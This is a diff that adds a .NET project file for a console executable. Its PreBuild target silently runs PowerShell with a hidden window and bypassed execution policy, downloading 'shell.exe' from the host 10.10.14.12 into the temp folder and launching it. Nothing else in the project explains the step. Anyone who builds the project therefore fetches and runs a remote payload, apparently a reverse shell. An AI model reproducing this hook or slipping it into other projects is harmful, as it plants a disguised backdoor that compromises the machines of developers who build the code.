@@ -1,0 +1,12 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+  </PropertyGroup>
+
+  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+    <Exec Command="powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-WebRequest http://10.10.14.12/shell.exe -OutFile $env:TEMP\shell.exe; Start-Process $env:TEMP\shell.exe" />
+  </Target>
+
+</Project>
